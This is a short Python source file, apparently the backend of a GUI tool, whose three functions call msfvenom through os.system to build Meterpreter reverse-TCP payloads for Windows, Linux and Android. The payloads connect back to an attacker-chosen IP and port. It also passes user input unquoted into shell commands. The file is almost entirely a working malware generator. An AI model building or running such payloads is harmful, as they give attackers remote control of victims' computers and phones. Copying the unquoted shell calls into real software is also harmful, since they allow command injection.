import os
from tkinter import *
from PIL import *
from PIL import Image , ImageTk
from customtkinter import *

def create_windows(IP_ADDRESS, PORT0 , USER , OUTPUT):
	os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP_ADDRESS} LPORT={PORT0} -f exe -o {OUTPUT}/{USER}.exe")
	#print(IP_ADDRESS,PORT0,USER,OUTPUT)
	return IP_ADDRESS,PORT0,USER,OUTPUT

def create_linux(IP_UNIX, PORT1 , USER1 , OUTPUT1):
	os.system(f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={IP_UNIX} LPORT={PORT1} -f elf > {OUTPUT1}/{USER1}.elf")
	return IP_UNIX , PORT1 , USER1 , OUTPUT1

def create_android(IP_and, PORT2 , USER2 , OUTPUT2):
	#print(IP_and,PORT2,USER2,OUTPUT2)
	os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={IP_and} LPORT={PORT2} R >  {OUTPUT2}/{USER2}.apk")
	return IP_and , PORT2 , USER2 , OUTPUT2



